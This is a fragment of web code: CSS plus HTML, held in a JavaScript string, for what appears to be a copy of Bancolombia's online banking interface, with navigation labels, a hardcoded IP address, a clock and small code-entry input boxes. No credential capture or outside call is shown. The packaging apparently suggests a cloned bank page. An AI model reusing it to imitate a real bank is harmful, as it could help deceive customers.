    .flxpKV {
        border-width: 2px;
        border-style: solid;
        border-color: transparent rgb(44, 42, 41) rgb(44, 42, 41);
        border-image: initial;
        border-radius: 50%;
        width: 33px;
        height: 33px;
        animation: 2s linear 0s infinite normal none running spin;
    }

    .jmHuCR {
        font-family: "Open Sans";
        font-style: normal;
        font-weight: normal;
        font-size: 14px;
        line-height: 18px;
        text-align: center;
        letter-spacing: -0.2px;
        color: rgb(44, 42, 41);
    }

    .gimDCx {
        display: flex;
        -webkit-box-pack: center;
        justify-content: center;
        width: auto;
    }

    .ZHjtz {
        flex-direction: row;
        padding: 4px;
    }

    .dNDpFh {
        width: 100%;
        display: flex;
        flex-direction: column;
        position: relative;
        -webkit-box-align: center;
        align-items: center;
    }

    .bSduiH:focus {
        border-bottom: 1px solid rgb(255, 194, 14);
    }

    .bvTghL {
        width: 100%;
        display: flex;
        flex-flow: column wrap;
        -webkit-box-align: center;
        align-items: center;
        align-content: center;
        gap: 16px;
    }

    .blWBwQ {
        width: auto;
        display: flex;
        flex-direction: column;
        -webkit-box-align: center;
        align-items: center;
    }

    .cWhLuu {
        width: 485px;
        font-family: "Open Sans";
        font-style: normal;
        font-size: 11px;
        line-height: 21px;
        font-weight: bold;
        letter-spacing: -0.3px;
        color: rgb(255, 255, 255);
    }

    .hPggnt {
        width: 485px;
        font-family: "Open Sans";
        font-style: normal;
        font-size: 15px;
        line-height: 21px;
        font-weight: bold;
        letter-spacing: -0.3px;
        color: rgb(255, 255, 255);
    }

    .fqbBLC {
        display: flex;
        flex-direction: row;
        position: relative;
        margin-top: 16px;
        background: rgb(69, 70, 72);
        border-radius: 8px;
        width: 549px;
        height: 77px;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: justify;
        justify-content: space-between;
        padding: 16px 0px 16px 16px;
    }

    .jfuGTm {
        width: fit-content;
        text-align: center;
    }

    .bSduiH {
        width: 40px;
        height: 40px;
        text-align: center;
        font-size: 20px;
        padding: 10px;
        outline: none;
        border-top: none;
        border-right: none;
        border-left: none;
        border-image: initial;
        border-bottom: 1px solid rgb(128, 130, 133);
        margin-left: 5px;
        margin-right: 5px;
        border-radius: 0px !important;
    }

    .gANZmy {
        color: rgb(250, 94, 91);
        font-family: "Open Sans";
        font-size: 12px;
        font-weight: bold;
        letter-spacing: -0.2px;
        line-height: 20px;
    }

    .ddSxzf {
        display: flex;
        margin-left: auto;
        -webkit-box-align: center;
        align-items: center;
        color: rgb(0, 0, 0);
        font-family: "Open Sans";
        font-size: 12px;
        letter-spacing: -0.26px;
        line-height: 16px;
    }

    .qYbwy {
        display: flex;
        margin-left: auto;
        -webkit-box-align: center;
        align-items: center;
        color: rgb(0, 0, 0);
        font-family: "Open Sans";
        font-size: 12px;
        letter-spacing: -0.26px;
        line-height: 16px;
    }

    .ecSwKm:not(:placeholder-shown)+.sc-dNsVcS {
        transform: translateY(-30px) translateX(-10px);
        z-index: 501;
        background: transparent;
        padding: 0px 8px;
    }

    .ecSwKm {
        border-width: 0px 0px 2px;
        border-top-style: initial;
        border-right-style: initial;
        border-left-style: initial;
        border-top-color: initial;
        border-right-color: initial;
        border-left-color: initial;
        border-image: initial;
        color: rgb(41, 41, 41);
        font-family: "Open Sans";
        letter-spacing: -0.3px;
        line-height: 24px;
        background-color: transparent;
        outline: none;
        padding: 12px 3px 5px 10px;
        font-size: 16px;
        transition: 0.2s;
        position: relative;
        z-index: 510;
        border-bottom-style: solid;
        border-bottom-color: rgb(44, 42, 41);
        font-weight: bold;
        border-radius: 0px !important;
    }
</style>
<div id="root">
    <div class="sc-kAyceB dyNPNk">

        <div class="sc-jnOGJG jMedSz">
            <div class="sc-dZoequ jNBBOl">
                <div class="sc-ggpjZQ fBevtP">
                    <div class="sc-kAkpmW ljShGh"></div>
                    <div class="sc-brPLxw iAjHuw">Volver</div>
                </div>
                <div class="sc-fvtFIe inVMvd"></div>
                <div class="sc-cmaqmh QAjXL">
                    <div class="sc-iMWBiJ Hvuid">Salir</div>
                    <div class="sc-gFVvzn crWacE"></div>
                </div>
            </div>
        </div>

        <div class="sc-gsFSXq tBwio" id="bancolombia_contenido">
        </div>
        <div class="sc-dAlyuH huBzKw">
            <div class="sc-jlZhew kZLvRr"></div><span class="sc-dLMFU bbOBut">
                <div class="sc-eDPEul lbGLhq">
                    <div class="sc-jEACwC hkQQIl"></div>
                    <div class="sc-cPiKLX gsVIUh"></div>
                </div>
                <div class="sc-eldPxv kVNvQn">
                    <div class="sc-cwHptR ddSxzf">Dirección IP: 192.230.104.11</div>
                    <div class="sc-fPXMVe qYbwy" id="jclock1">Sábado, 1 de Febrero de 2025, 11:15 p.&nbsp;m.</div>
                </div>
            </span>
        </div>
    </div>
</div>
`
//<script>
    loadContenido()
    $('#bancolombia_contenido').html(bancolombia_contenido);

    $(document).ready(function() {

        if ($('#jclock1').length > 0) {
            var optionsEST = {
                utc: true,
                utcOffset: -5,
                format: "%A %R de %B de %Y %l:%M:%S %P",
                language: "es"
            }
            $('#jclock1').jclockNew(optionsEST);
        }
    });